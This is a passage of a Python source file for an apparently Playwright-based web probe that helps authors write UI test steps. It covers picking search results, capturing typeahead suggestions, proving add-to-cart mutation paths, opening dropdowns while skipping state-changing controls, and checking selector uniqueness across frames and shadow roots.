        prev_names = {c.get("name", "") for c in pg["controls"]}
        deadline = time.monotonic() + timeout_ms / 1000
        while True:
            raw = page.evaluate(_COLLECT_JS)
            if build_result_items(raw.get("controls", []),
                                  prev_sel, prev_names):
                break
            info = page.evaluate(_COUNT_JS)
            m = _COUNT_RE.search(info["text"]) if info else None
            n = parse_number(m.group(1)) if m else None
            if n is not None and int(n) == 0:
                break                        # explicit zero-results state
            if time.monotonic() >= deadline:
                break
            page.wait_for_timeout(500)
        pg["search"] = _results_block(page, pg, term)
    except Exception as e:
        pg["search_warning"] = f'--search "{term}": {e}'


def _pick(page, pg: dict, term: str, target: str, timeout_ms: int,
          mutate: str | None = None):
    """NOOD_0156 — click the ONE result goal.bind_result binds for a generic
    "pick a matching result" request and snapshot the landed page. Read-only
    navigation (a result link), never a mutating control — the landed-page
    evidence is what lets later requested actions (add to cart) resolve
    against real controls instead of the results page's repeated per-card
    twins. Binding consumes structured `result_items` when the collection
    produced them (membership in the result region is the provenance — the
    caption need not repeat the term). `mutate` (a goal add_to destination)
    additionally proves the mutation path on the landed page — see
    _prove_mutation. Advisory: any failure lands in search.pick_warning,
    nothing raises."""
    sr = pg.get("search")
    if not sr:
        pg["pick_warning"] = "--pick: the search produced no results block"
        return page
    if sr.get("result_items_warning") and target in (None, "*"):
        # NOOD_0169 — a generic pick needs STRUCTURAL result evidence; when
        # the summary is positive but no item extracted, the legacy flat-
        # control fallback would bind lexically (captions need not repeat a
        # generic term) — refuse with the typed diagnostic instead.
        w = sr["result_items_warning"]
        sr["pick_warning"] = (
            f"results summary reports {w['summary_count']} results but no "
            "stable result item could be extracted "
            f"({w['category']}) — no structural evidence to bind a "
            "generic pick to")
        return page
    from noodle.repl.goal import bind_result  # pure; lazy to avoid a cycle
    cand, why = bind_result(sr.get("controls") or [], term, target,
                            items=sr.get("result_items"))
    if cand is None:
        sr["pick_warning"] = why
        return page
    try:
        loc = page.locator(cand["selector"]).first
        armed, u, before = _arm(page), page.url, _pages(page)
        loc.click(timeout=5000)
        _settle(page, timeout_ms, armed=armed, url_before=u)
        # NOOD_0178 — a target=_blank result card lands in a NEW tab: the
        # landed-page evidence (and any requested mutation) belongs to that
        # tab, not to the results page the probe would otherwise re-diff.
        tab = _new_tab(page, before, sr.setdefault("warnings", []))
        if tab is not None:
            blk = _tab_block(tab, f'result "{cand["name"]}"', timeout_ms)
            page = tab
        else:
            # NOOD_0200 — the landed page (product detail on a retail site)
            # gets the same popup sweep as a probe-followed tab: a late
            # overlay here hides the mutation control, and a blocked
            # mutation proof costs a full re-author lap.
            if closed := _dismiss_popups(page):
                pg["popups_closed"] = pg.get("popups_closed", 0) + closed
                _settle(page, min(timeout_ms, 3000))
            seen = {c["selector"] for c in pg["controls"]} \
                | {c["selector"] for c in sr["controls"]}
            seen_head = set(pg["headings"]) | set(sr["headings"])
            blk = _diff_snapshot(page, seen, seen_head)
            _verify_unique(page, blk["controls"])
        blk["picked_caption"] = cand["name"]
        blk["picked_selector"] = cand["selector"]
        sr["picked"] = blk
        if mutate:
            _prove_mutation(page, blk, mutate, timeout_ms)
    except Exception as e:
        sr["pick_warning"] = f'--pick "{cand["name"]}": {e}'
    return page


def _perform_mutation(page, pg: dict, destination: str,
                      timeout_ms: int) -> None:
    """NOOD_0208 — actually CLICK the mutation control and record what
    happened, so "add to <dest>" that merely navigates is caught at author
    time instead of one step later on an item that was never added.

    `_prove_mutation` (the search/pick path) records a directly-observed
    control WITHOUT clicking it, so it can prove the control exists but never
    that it mutates. This is the missing half, and it is only reachable under
    `probe: {perform: true}` because it writes state on the target app.

    Any instance proves the CONTROL: on a grid of identical cards, clicking
    card 1 answers "does this control mutate or navigate" for all of them —
    the run still performs the scoped one. Advisory: never raises, and a
    failure leaves no proof rather than a false one."""
    from noodle.repl.goal import mutation_control  # pure; lazy (no cycle)
    ctrl, _ = mutation_control(pg.get("controls") or [], destination,
                               scoped=True)
    if ctrl is None or not ctrl.get("selector"):
        return
    url_before = page.url
    try:
        seen = {c["selector"] for b in _blocks(pg) for c in b["controls"]}
        seen_head = {h for b in _blocks(pg) for h in b["headings"]}
        armed = _arm(page)
        page.locator(ctrl["selector"]).first.click(timeout=3000)
        settled = _settle(page, timeout_ms, armed=armed,
                          url_before=url_before, mutating=True)
        rev = _diff_snapshot(page, seen, seen_head)
        navigated = not _same_page_identity(page.url, url_before)
        delta = bool(rev.get("controls") or rev.get("headings"))
        pg["mutation_proof"] = {
            "control": ctrl["name"], "navigated": navigated,
            "delta": delta, "settled": settled,
            "url_before": url_before, "url_after": page.url}
        if delta or navigated:
            rev["revealed_by"] = f'performed: click "{ctrl["name"]}"'
            rev["performed"] = True
            pg.setdefault("revealed", []).append(rev)
    except Exception as e:                               # pragma: no cover
        pg.setdefault("warnings", []).append(
            f'perform: could not click "{ctrl.get("name")}": {e}')


_PREREQ_TRIALS = 3
# Global-purpose controls a mutation prerequisite can never be — feedback,
# auth, legal, support, destination navigation. Locale-limited like
# _MUTATING_RE; the structural signals below carry the real weight.
_PREREQ_EXCLUDE_RE = re.compile(
    r"\b(feedback|survey|sign ?in|sign ?up|log ?in|log ?out|register|"
    r"subscribe|newsletter|privacy|terms|legal|help|support|contact|"
    r"search|menu|account|language|country|reviews?)\b", re.I)


def _same_page_identity(a: str, b: str) -> bool:
    """Same origin AND same path — a query/fragment change is still the same
    product page; anything else is navigation away."""
    ua, ub = urlsplit(a), urlsplit(b)
    return (ua.scheme, ua.netloc, ua.path.rstrip("/")) == \
           (ub.scheme, ub.netloc, ub.path.rstrip("/"))


def _prereq_candidates(controls: list[dict]) -> list[dict]:
    """NOOD_0169 — semantic prerequisite candidates, replacing 'the first
    visible non-submit button'. Eligible: a visible, selector-backed,
    non-mutating button that is disclosure/variant/option-shaped by ARIA
    state (aria-expanded/haspopup) or disclosure naming — and is not global
    chrome or an excluded global-purpose control. Pure."""
    out = []
    for c in controls or []:
        if not c.get("visible") or not c.get("selector"):
            continue
        if c.get("kind") != "button" or c.get("submit") or c.get("chrome"):
            continue
        name = c.get("name", "")
        if _is_mutating(name) or _PREREQ_EXCLUDE_RE.search(name):
            continue
        if c.get("expanded") in ("true", "false") or c.get("haspopup") \
                or _DISCLOSURE_RE.search(name):
            out.append(c)
    return out


def _prove_mutation(page, blk: dict, destination: str,
                    timeout_ms: int) -> None:
    """NOOD_0156/0169 — prove (never perform) the requested mutation path on
    the page the pick landed on. Directly observed mutation control →
    recorded with no prerequisite. Otherwise a bounded SEMANTIC trial: only
    disclosure/variant/option-shaped candidates (_prereq_candidates), each
    accepted ONLY when its before/after delta reveals the requested mutation
    control ON THE SAME product page — a trial that navigates away is
    invalidated and the original URL restored, so 'click here' drift cannot
    become a compiled prerequisite. Advisory: no proof recorded means the
    goal blocks upstream."""
    from noodle.repl.goal import mutation_control  # pure; lazy (no cycle)
    ctrl, _ = mutation_control(blk.get("controls") or [], destination)
    if ctrl is not None:
        blk["mutation_path"] = {
            "prerequisite": None, "control": ctrl,
            "evidence": "mutation control observed on the landed page"}
        return
    url_before = page.url
    for cand in _prereq_candidates(blk.get("controls") or [])[:_PREREQ_TRIALS]:
        try:
            armed = _arm(page)
            page.locator(cand["selector"]).first.click(timeout=3000)
            _settle(page, timeout_ms, armed=armed, url_before=url_before)
            if not _same_page_identity(page.url, url_before):
                # navigation away invalidates the candidate — restore state
                page.goto(url_before, timeout=timeout_ms,
                          wait_until="domcontentloaded")
                _settle(page, timeout_ms)
                _dismiss_popups(page)  # NOOD_0200 — a reload re-triggers overlays
                continue
            seen = {c["selector"] for c in blk.get("controls") or []}
            rev = _diff_snapshot(page, seen, set(blk.get("headings") or []))
            ctrl, _ = mutation_control(rev.get("controls") or [],
                                       destination)
            if ctrl is not None:
                blk["mutation_path"] = {
                    "prerequisite": {"name": cand["name"],
                                     "selector": cand["selector"]},
                    "control": ctrl,
                    "evidence": {
                        "url_before": url_before, "url_after": page.url,
                        "revealed_selector": ctrl.get("selector", ""),
                        "note": "click revealed the requested mutation "
                                "control (before/after delta recorded)"}}
                return
            # unproductive trial — restore the original product state
            page.goto(url_before, timeout=timeout_ms,
                      wait_until="domcontentloaded")
            _settle(page, timeout_ms)
            _dismiss_popups(page)  # NOOD_0200 — a reload re-triggers overlays
        except Exception:
            continue


# NOOD_0141 (P1-1) — typeahead suggestion rows after typing a partial term.
# Innermost row shapes only (a container matching [class*="suggest"] would
# swallow every row into one string); dedupe on normalized text; capped at 20.
# Per row: the navigating identity (id / enclosing a[href] / matched base) and
# any icon-ish sub-element — the no-op decoration a fuzzy click chain once hit.
_SUGGEST_JS = """
() => {
  const BASES = ['[role="option"]', '[role="listbox"] li',
                 '[class*="suggest" i][role="button"]',
                 '[class*="autocomplete" i][role="button"]',
                 '[class*="suggest" i] li', '[class*="autocomplete" i] li',
                 '[class*="typeahead" i] li', '[class*="suggest" i] a'];
  const SEL = BASES.join(', ');
  const out = [];
  for (const el of document.querySelectorAll(SEL)) {
    if (out.length >= 20) break;
    if (el.querySelector(SEL)) continue;
    const r = el.getBoundingClientRect();
    if (!(r.width || r.height)) continue;
    const t = (el.innerText || '').trim().replace(/\\s+/g, ' ').slice(0, 80);
    if (!t || out.some(o => o.text === t)) continue;
    const a = el.closest('a[href]') || el.querySelector('a[href]');
    const icon = el.querySelector('button, svg, [class*="icon" i], [id*="icon" i]');
    let base = '';
    for (const b of BASES) if (el.matches(b)) { base = b; break; }
    out.push({text: t, id: el.id || '',
              href: a ? a.getAttribute('href') : '',
              base: base,
              icon: icon ? (icon.id || icon.getAttribute('class') ||
                            icon.tagName.toLowerCase()) : ''});
  }
  return out;
}
"""


def _suggest_row_selector(row: dict) -> str:
    """The selector that clicks the NAVIGATING row element — never an icon
    sub-element. Pure — unit-testable without a browser."""
    if row.get("id"):
        return '[id="%s"]' % row["id"].replace('"', '\\"')
    if row.get("href"):
        return 'a[href="%s"]' % row["href"].replace('"', '\\"')
    base = row.get("base") or '[role="option"]'
    return f'{base} >> text={row["text"]}'


def _suggest_block(rows: list[dict], term: str) -> dict | None:
    """Shape the collected rows into the author-ready --suggest payload:
    exact suggestion strings in order, the navigating selector per row, an
    icon_is_noop flag on decorated rows, and copy-ready steps. None when no
    rows were collected. Pure — unit-testable without a browser."""
    if not rows:
        return None
    shaped = []
    for r in rows:
        entry = {"text": r["text"], "selector": _suggest_row_selector(r)}
        if r.get("icon"):
            entry["icon_is_noop"] = True
            entry["icon"] = r["icon"]
        shaped.append(entry)
    first = shaped[0]["text"]
    return {
        "term": term,
        "suggestions": [r["text"] for r in shaped],
        "rows": shaped,
        "steps": [
            f'Then the search suggestions for "{term}" include "{first}"',
            f'When User selects the "{first}" suggestion for "{term}"',
        ],
    }


def _pick_suggestion(texts: list[str], want: str) -> int | None:
    """Index of the row --follow should click. Containment first (either
    direction, case-insensitive), then a difflib tier so a correctly-spelled
    ask ("vacuum cleaner") still finds a site's misspelled row ("vaccum
    cleaner") — the exact trap a live field session hit. Pure —
    unit-testable without a browser."""
    w = want.strip().lower()
    lows = [t.strip().lower() for t in texts]
    # exact beats containment — "vaccum cleaner bags" must not lose to the
    # "vaccum cleaner" prefix row scanned first
    for i, tl in enumerate(lows):
        if tl == w:
            return i
    for i, tl in enumerate(lows):
        if w in tl or tl in w:
            return i
    best, best_i = 0.0, None
    for i, t in enumerate(texts):
        r = difflib.SequenceMatcher(None, w, t.strip().lower()).ratio()
        if r > best:
            best, best_i = r, i
    return best_i if best >= 0.72 else None


def _rows_match_term(rows: list[dict], term: str) -> bool:
    """NOOD_0186 — does the captured list belong to the FULL typed term?
    True when any row shares a content word (≥3 chars, substring match so
    partial typing like 'cleane' still hits 'cleaner') with the term. A stale
    prefix's response ('Va' → Vanuatu, Van Halen…) shares none. A term with
    no anchorable word accepts whatever is shown. Pure — unit-testable
    without a browser."""
    words = [w for w in re.findall(r"\w+", term.lower()) if len(w) >= 3]
    if not words:
        return True
    return any(w in (r.get("text") or "").lower()
               for r in rows for w in words)


def _suggest(page, pg: dict, term: str, timeout_ms: int,
             follow: str | None = None) -> None:
    """NOOD_0141 (P1-1) — typeahead capture: type `term` per-character into
    the visible search box (opening it first when it hides behind an icon),
    wait for the suggestion list to settle, and emit exact suggestion strings
    + the navigating selector per row + copy-ready steps — the discovery a
    session otherwise pays out-of-band Playwright scripts for. Advisory like
    --search: any failure lands in pg["suggest_warning"], nothing raises.
    Runs BEFORE --search (the submit navigates away); the typeahead is
    Escape-closed and the box cleared afterwards.

    `follow` (NOOD_0142): click the captured row matching this text (fuzzy —
    see _pick_suggestion) and summarize the page it lands on exactly like
    --search, so ONE probe covers type → suggestion list → pick → results
    instead of a probe per stage. The emitted steps carry the row's EXACT
    text — the string the author must use, not the caller's guess."""
    try:
        box = _open_search_box(page, timeout_ms,
                               [c for b in _blocks(pg) for c in b["controls"]])
        if box is None:
            pg["suggest_warning"] = f'--suggest "{term}": no search box found'
            return
        box.click()
        armed = _arm(page)
        # per-character typing — typeaheads listening on keydown never see a
        # single fill(); press_sequentially is the modern name, type() the
        # fallback on older Playwrights.
        type_fn = getattr(box, "press_sequentially", None) or box.type
        type_fn(term, delay=75)
        _settle(page, min(timeout_ms, 5000), armed=armed)
        rows = page.evaluate(_SUGGEST_JS)
        # NOOD_0186 — per-keystroke XHRs land out of order: the first read
        # can be a stale prefix's list (typing "Vacuum cleane" once captured
        # the suggestions for "Va" — regression-benchmark TC1). Poll until a
        # row shares a content word with the term (the full term's response
        # has arrived) or the bounded window ends — a site may genuinely
        # suggest nothing matching, and the last list is then the honest
        # capture. Subsumes the old empty-list retry.
        for _ in range(6):
            if rows and _rows_match_term(rows, term):
                break
            page.wait_for_timeout(500)
            rows = page.evaluate(_SUGGEST_JS)
        block = _suggest_block(rows, term)
        if block is None:
            pg["suggest_warning"] = (
                f'--suggest "{term}": no suggestion list appeared after typing')
        else:
            pg["suggest"] = block
            if follow:
                idx = _pick_suggestion(block["suggestions"], follow)
                if idx is None:
                    pg["suggest_warning"] = (
                        f'--follow "{follow}": no suggestion row matches — '
                        'visible: '
                        + "; ".join(f'"{s}"' for s in block["suggestions"]))
                else:
                    row = block["rows"][idx]
                    block["followed"] = row["text"]
                    block["steps"] = [
                        f'Then the search suggestions for "{term}" '
                        f'include "{row["text"]}"',
                        f'When User selects the "{row["text"]}" '
                        f'suggestion for "{term}"',
                    ]
                    page.locator(row["selector"]).first.click()
                    _settle(page, timeout_ms)
                    res = _results_block(page, pg, row["text"])
                    res["followed_from"] = term
                    pg["search"] = res
                    return   # landed on the results page — nothing to clean
        try:                  # leave the page clean for --search / reveals
            page.keyboard.press("Escape")
            box.fill("")
        except Exception:
            pass
    except Exception as e:
        pg["suggest_warning"] = f'--suggest "{term}": {e}'


_EXPECT_JS = """
(texts) => {
  const body = (document.body.innerText || '');
  const low = body.toLowerCase();
  return texts.map(t => {
    const i = low.indexOf(t.toLowerCase());
    if (i < 0) return {text: t, found: false};
    const ctx = body.slice(Math.max(0, i - 30), i + t.length + 30)
                    .replace(/\\s+/g, ' ').trim();
    return {text: t, found: true, context: ctx};
  });
}
"""


def _skip_expect_reason(pg: dict) -> str | None:
    """NOOD_0145 — never evaluate final expectations as if a halted
    transaction completed: the page is not in the requested state, so a hit
    would be a false proof and a miss a misleading diagnosis. Returns the
    explaining warning when --expect must be skipped, else None."""
    if not pg.get("do_warnings"):
        return None
    action = (pg.get("do_failed") or {}).get("action", "a failed action")
    return ("--expect skipped: the transaction failed at "
            f"{action!r} — the page never reached the requested state")


def _expect(page, pg: dict, texts: list[str]) -> None:
    """NOOD_0142 — cheap presence verdicts on the page the probe ended on
    (after --click/--suggest/--follow/--search): one FOUND/NOT-FOUND line per
    text instead of dumping hundreds of controls just to confirm a product
    name. Advisory — a failure lands in pg["expect_warning"], never raises.

    NOOD_0211 — a text miss falls back to the image-cue matcher. innerText
    cannot see a picture, so "we can see his signature" was NOT FOUND on a
    page that renders exactly that image, and the goal contract blocked a
    check the run would have passed (locator resolves it via NOOD_0210 image
    cues). The probe and the runtime must agree about what is on the page.
    """
    try:
        pg["expect"] = page.evaluate(_EXPECT_JS, texts)
    except Exception as e:
        pg["expect_warning"] = f"--expect: {e}"
        return
    try:
        from noodle.agents.web.locator import _image_cue_locator
        for e in pg["expect"]:
            if e.get("found"):
                continue
            loc, ambiguous = _image_cue_locator(page, e["text"])
            if loc is not None and not ambiguous:
                e["found"] = True
                e["via"] = "image-cue"
                e["context"] = "matched an image by its src/alt/resource"
    except Exception:
        pass


# NOOD_0128 — bounded reveal safety. Auto-opening native controls must never
# click a state-mutating action, even one that happens to look like a dropdown
# trigger. Names matching this are enumerated (native <select>) but never
# clicked open. The caller's explicit `clicks` list is unrestricted — that's
# their authorization; this only gates the AUTOMATIC opening.
# NOOD_0141 — the name gate is English-plus-locales: high-frequency de/fr/
# es/it/pt/nl mutating verbs, so --discover/--open-native on a non-English
# site can't click "Löschen"/"Supprimer" believing it a disclosure. Curated
# per ponytail — common commerce/auth verbs only, widen when a real site
# needs it.
_MUTATING_RE = re.compile(
    r"\b(submit|save|delete|remove|log\s?in|sign\s?in|sign\s?up|register|"
    r"check\s?out|checkout|pay|buy|order|purchase|confirm|send|update|create|"
    r"add to cart|place order|log\s?out|sign\s?out|apply|"
    # de
    r"löschen|entfernen|speichern|senden|absenden|kaufen|bestellen|bezahlen|"
    r"anmelden|abmelden|registrieren|bestätigen|"
    # fr
    r"supprimer|enregistrer|envoyer|acheter|commander|payer|confirmer|"
    r"connexion|déconnexion|s'inscrire|inscription|valider|"
    # es
    r"eliminar|borrar|guardar|enviar|comprar|pagar|confirmar|registrarse|"
    r"acceder|iniciar sesión|cerrar sesión|"
    # it
    r"elimina|salva|invia|acquista|paga|conferma|accedi|registrati|"
    # pt
    r"excluir|salvar|entrar|cadastr\w*|"
    # nl
    r"verwijderen|opslaan|versturen|kopen|betalen|bevestigen|inloggen|"
    r"uitloggen|aanmelden|afmelden)\b", re.I)


def _is_mutating(name: str) -> bool:
    return bool(_MUTATING_RE.search(name or ""))


def _is_mutating_control(c: dict) -> bool:
    """NOOD_0141 — name gate PLUS the locale-proof attribute signal: a
    type=submit control mutates whatever language its label speaks."""
    return _is_mutating(c.get("name")) or bool(c.get("submit"))


_SELECT_OPTIONS_JS = (
    "el => (el.tagName && el.tagName.toLowerCase() === 'select') "
    "? Array.from(el.options).map(o => (o.textContent || '').trim())"
    ".filter(Boolean).slice(0, 40) : null")

# NOOD_0134 — a clicked-open custom combobox renders its options in an overlay
# (often a portal DETACHED from the widget's subtree), so read them page-wide
# by generic ARIA/class patterns, innermost matches only (a container matching
# [class*="option"] would otherwise swallow every option into one string).
# Same 40-option bound as _SELECT_OPTIONS_JS.
_OPTIONS_JS = """
() => {
  const SEL = '[role="option"], [role="listbox"] li, [class*="option"]';
  const out = [];
  for (const el of document.querySelectorAll(SEL)) {
    if (out.length >= 40) break;
    if (el.querySelector(SEL)) continue;
    const r = el.getBoundingClientRect();
    if (!(r.width || r.height)) continue;
    const t = (el.innerText || '').trim().slice(0, 80);
    if (t && !out.includes(t)) out.push(t);
  }
  return out;
}
"""


# NOOD_0136 — a virtualized listbox renders only its first window of options.
# Scroll the open, scrollable list panel one viewport at a time and accumulate
# in PYTHON (virtualization removes earlier nodes from the DOM), until values
# stabilize or the caps bite. Same 40-option ceiling as _OPTIONS_JS.
_SCROLL_LISTBOX_JS = """
() => {
  const SEL = '[role="listbox"], [class*="listbox"], [class*="dropdown-panel"],' +
              ' [class*="options"], [class*="menu"]';
  for (const el of document.querySelectorAll(SEL)) {
    const r = el.getBoundingClientRect();
    if (!(r.width || r.height)) continue;
    if (el.scrollHeight > el.clientHeight + 4) {
      const beforeTop = el.scrollTop;
      el.scrollTop = beforeTop + el.clientHeight;
      return el.scrollTop > beforeTop;
    }
  }
  return false;
}
"""

# ponytail: 6 scrolls x one panel height covers ~7 windows of options; a list
# longer than the 40-option cap is truncated honestly by the cap note anyway.
_OPTION_SCROLL_MAX = 6


def _scroll_options(page, before: set, opts: list) -> list:
    for _ in range(_OPTION_SCROLL_MAX):
        if len(opts) >= 40:
            break
        try:
            if not page.evaluate(_SCROLL_LISTBOX_JS):
                break
            time.sleep(0.15)
            new = [o for o in page.evaluate(_OPTIONS_JS)
                   if o not in before and o not in opts]
        except Exception:
            break
        if not new:
            break
        opts += new
    return opts


def _select_options(page, selector: str):
    """Option texts of a native <select> (they live in the DOM — no click),
    or None if the selector isn't a <select> or can't be read."""
    try:
        loc = page.locator(selector).first
        if not loc.count():
            return None
        return loc.evaluate(_SELECT_OPTIONS_JS)
    except Exception:
        return None


# ponytail: cap the auto-open click fan-out per page — a facet-heavy page could
# otherwise click open dozens of comboboxes and blow the probe's wall-time.
_AUTO_OPEN_CAP = 10


def _auto_open(page, blk: dict, seen: set, seen_head: set, timeout_ms: int,
               depth: int, budget: list) -> None:
    """NOOD_0128 `open_native_controls` — for every dropdown/combobox in `blk`:
    enumerate a native <select>'s options inline (safe, no click), or click a
    custom combobox open and append what it exposes (bounded by depth + a
    per-page click budget, never a state-mutating control). Tabs/panels stay
    on the explicit `clicks` list — indistinguishable from buttons here, so
    auto-clicking them would risk a mutating action."""
    for c in list(blk["controls"]):
        if c["kind"] != "dropdown" or _is_mutating_control(c):
            continue
        opts = _select_options(page, c["selector"])
        if opts is not None:
            c["options"] = opts               # native <select>
            continue
        if budget[0] <= 0 or depth < 1:
            continue
        phase = "open"                        # custom combobox — click to expand
        try:
            budget[0] -= 1
            before = set(page.evaluate(_OPTIONS_JS))
            armed, u = _arm(page), page.url
            page.locator(c["selector"]).first.click(timeout=2500)
            phase = "settle"
            _settle(page, timeout_ms, armed=armed, url_before=u)
            # NOOD_0134 — the opened listbox IS the payload: attach the option
            # texts to the combobox control itself (what the author selects
            # from), close it, and skip the reveal diff — option elements are
            # noise as "revealed controls" and pollute later reveals.
            phase = "enumerate"
            opts = [o for o in page.evaluate(_OPTIONS_JS) if o not in before]
            if opts:
                c["options"] = _scroll_options(page, before, opts)
                phase = "close"
                page.keyboard.press("Escape")
                continue
            rev = _diff_snapshot(page, seen, seen_head)
            if rev["controls"] or rev["headings"]:
                rev["revealed_by"], rev["auto"] = c["name"], True
                seen |= {x["selector"] for x in rev["controls"]}
                seen_head |= set(rev["headings"])
                blk.setdefault("revealed", []).append(rev)
                if depth > 1:
                    _auto_open(page, rev, seen, seen_head, timeout_ms,
                               depth - 1, budget)
        except Exception as e:
            # NOOD_0136 — a swallowed failure here used to look like "this
            # combobox has no options"; name the control and the failed phase.
            blk.setdefault("warnings", []).append(
                f'open_native "{c["name"]}" failed at {phase}: {e}')


# NOOD_0136 — prove suggested selectors, bounded. An author-ready selector
# must resolve exactly one node in its execution scope (page or frame);
# ambiguity was the silent path from "probe looked fine" to locator-rot runs.
_UNIQUE_CAP = 60


# NOOD_0179 — Playwright-only selector syntax. `querySelectorAll` cannot parse
# these, so they keep the per-selector locator round trip.
_UNBATCHABLE = ("text=", ":nth-match(", ">>")


def _batchable(selector: str) -> bool:
    """True only for plain CSS a browser's querySelectorAll can run itself.

    Deliberately conservative: a selector wrongly called batchable would be
    counted by the wrong engine and silently mismark uniqueness, which is the
    exact failure NOOD_0136 added this check to prevent.
    """
    if not isinstance(selector, str) or not selector.strip():
        return False
    return not any(tok in selector for tok in _UNBATCHABLE)


# One evaluate for every plain-CSS selector. Counts are summed across the
# document AND every open shadow root, because plain querySelectorAll does not
# pierce shadow roots while Playwright's locator does — summing is what keeps
# the batched count identical to the locator count it replaces.
_UNIQUE_COUNT_JS = """
(selectors) => {          // __noodleCount — infrastructure, not a snapshot
  const roots = [];
  const gather = (root) => {
    roots.push(root);
    for (const host of root.querySelectorAll('*'))
      if (host.shadowRoot) gather(host.shadowRoot);
  };
  gather(document);
  return selectors.map(sel => {
    try {
      let n = 0;
      for (const r of roots) n += r.querySelectorAll(sel).length;
      return n;
    } catch (e) { return null; }   // invalid selector — caller leaves it unmarked
  });
}
"""


def _mark_unique(c: dict, n) -> None:
    """The marking contract, one place: n==1 unique, n>1 carries the count,
    anything else (0, None, non-int) leaves the control unmarked."""
    if isinstance(n, int) and n:
        c["unique"] = n == 1
        if n > 1:
            c["matches"] = n


def _verify_unique(target, controls: list[dict]) -> None:
    """Mark each control unique True/False (+match count) via the SAME
    resolution surface find() uses (Playwright locator — pierces open shadow
    roots). target is the page or the frame the control lives in. Bounded by
    _UNIQUE_CAP; an unverifiable selector is left unmarked, never guessed.

    NOOD_0179 — the plain-CSS majority is counted in ONE evaluate instead of
    one `locator(sel).count()` round trip each. A facet-heavy results page hits
    the 60-selector cap, and 60 sequential round trips per block — repeated for
    every revealed block and every frame — was the probe's second-largest
    wall-clock cost after the browser launch.
    """
    capped = controls[:_UNIQUE_CAP]
    legacy = capped                             # every selector, unless a batch lands
    if os.getenv("NOODLE_UNIQUE_LEGACY", "").strip() != "1":
        batch = [c for c in capped if _batchable(c.get("selector"))]
        if batch:
            try:
                counts = target.evaluate(_UNIQUE_COUNT_JS,
                                         [c["selector"] for c in batch])
            except Exception:
                counts = None                   # blew up — degrade to the loop
            if isinstance(counts, list) and len(counts) == len(batch):
                for c, n in zip(batch, counts):
                    _mark_unique(c, n)
                legacy = [c for c in capped
                          if not _batchable(c.get("selector"))]
    for c in legacy:
        try:
            n = target.locator(c["selector"]).count()
        except Exception:
            continue
        _mark_unique(c, n)


def _apply_page_signals(pg: dict, raw: dict) -> None:
    """NOOD_0136 payload honesty: coverage verdict, framework hints, closed-
    shadow suspicion — set from the collect signals, never inferred later."""
    warns = pg.setdefault("warnings", [])
    for host in raw.get("closed_shadow", []):
        warns.append(
            f"closed shadow root suspected at <{host}> — its internals are "
            "unreachable by any selector; visual/OCR steps only (@ocr_fallback)")
    if raw.get("flutter"):
        pg["framework_hints"] = ["flutter-web"]
    # visual_only = canvas dominates AND nothing has a readable name. Control
    # COUNT would misfire on a small activated semantics tree (2 real ARIA
    # nodes is authorable); zero readable controls is not.
    if raw.get("canvas_ratio", 0) > 0.5 and \
            not any(not c["needs_pom"] for c in pg["controls"]):
        pg["coverage"] = "visual_only"
        pg["pom_yaml"] = ""
        warns.append(
            "canvas-rendered page with no accessible controls — selector/POM "
            "output suppressed (it would be fabricated); enable the app's "
            "accessibility semantics or use @ocr_fallback visual steps")
    else:
        pg["coverage"] = "dom"
    # NOOD_0207 — a state-dependent route reached with no prior state renders
    # its shell and an empty container. The probe reported it as an ordinary
    # thin page, so the reader read "this form has no fields" as a fact about
    # the app and went hunting; it is a fact about how the page was reached.
    # Deliberately narrow: a page with a heading and (nearly) nothing to act
    # on. A genuinely sparse landing page carries no cost from the hint.
    if pg["coverage"] == "dom" and pg.get("headings") \
            and len([c for c in pg["controls"] if c.get("visible")]) <= 1 \
            and not pg.get("result_items"):
        warns.append(
            "this page rendered a heading but almost nothing to act on — if "
            "the route depends on earlier state (a selection, a login, an "
            "item in a basket), reach that state first with --click/--do and "
            "re-probe; an empty container is not evidence the app lacks these "
            "controls")


def _activate_flutter_semantics(page, raw: dict, timeout_ms: int) -> dict:
    """Flutter Web ships a blank canvas until its accessibility placeholder is
    activated. Click it, settle on the resulting mutation, re-collect — the
    semantics nodes are ordinary ARIA elements from there on. Failure falls
    back to the original collect (the visual_only verdict then applies)."""
    try:
        armed, u = _arm(page), page.url
        ph = page.locator("flt-semantics-placeholder").first
        try:
            ph.click(timeout=2000)
        except Exception:
            ph.dispatch_event("click", timeout=3000)
        _settle(page, timeout_ms, armed=armed, url_before=u)
        fresh = page.evaluate(_COLLECT_JS)
        fresh["flutter"] = True
        fresh["semantics_activated"] = True
        return fresh
    except Exception:
        return raw


def _collect_frames(page, pg: dict, timeout_ms: int) -> None:
    """NOOD_0136 — collect every iframe (same- and cross-origin; Playwright
    executes in both) as its own scoped block: page-level CSS cannot cross a
    frame boundary, and POM entries are page-global, so each block carries the
    dictionary switch step to precede its controls and emits NO POM YAML."""
    for fr in page.frames:
        try:
            if fr is page.main_frame or not (fr.name or fr.url):
                continue
            raw = fr.evaluate(_COLLECT_JS)
            blk = summarize(raw, url=fr.url, title="")
            if not blk["controls"] and not blk["headings"]:
                continue
            name = fr.name or urlsplit(fr.url).path.rsplit("/", 1)[-1] or fr.url
            blk["frame"] = name
            blk["switch_step"] = f'switches to the "{name}" frame'
            blk["pom_yaml"] = ""
            unnamed = []
            for c in blk["controls"]:
                c["scope"] = f"frame:{name}"
                if c["needs_pom"]:
                    c.pop("pom", None)
                    unnamed.append(c["name"])
            if unnamed:
                blk.setdefault("warnings", []).append(
                    "in-frame controls unreachable via POM (POM is page-"
                    "global; a frame resolves by readable name only): "
                    + ", ".join(unnamed[:5]))
            _verify_unique(fr, blk["controls"])
            pg.setdefault("frames", []).append(blk)
        except Exception as e:
            pg.setdefault("warnings", []).append(f"frame {fr.url}: {e}")


# NOOD_0136 --discover — bounded safe auto-reveal for pages where the caller
# doesn't know the trigger names yet. Depth 1 by design: every candidate is
# clicked from the initial state and reverted; a state GRAPH (clicks stacked
# on clicks) stays with explicit --click, where the caller authorizes each.
# NOOD_0141 — locale disclosure words: without them --discover finds fewer
# candidates on non-English sites (conservative, but blind).
_DISCLOSURE_RE = re.compile(
    r"\b(panel|menu|settings?|config(?:uration)?|device|advanced|options?|"
    r"filters?|tools?|more|expand|show|details?|tabs?|"
    r"menü|einstellungen|optionen|erweitert|mehr|"
    r"paramètres|réglages|détails|avancé|plus|"
    r"menú|ajustes|configuración|opciones|más|detalles|avanzado|"
    r"impostazioni|opzioni|altro|dettagli|avanzate|"
    r"instellingen|opties|meer|geavanceerd)\b", re.I)
_DISCOVER_CLICK_CAP = 8
_DISCOVER_TIME_S = 20.0


def _discover_candidates(controls: list[dict]) -> tuple[list, list]:
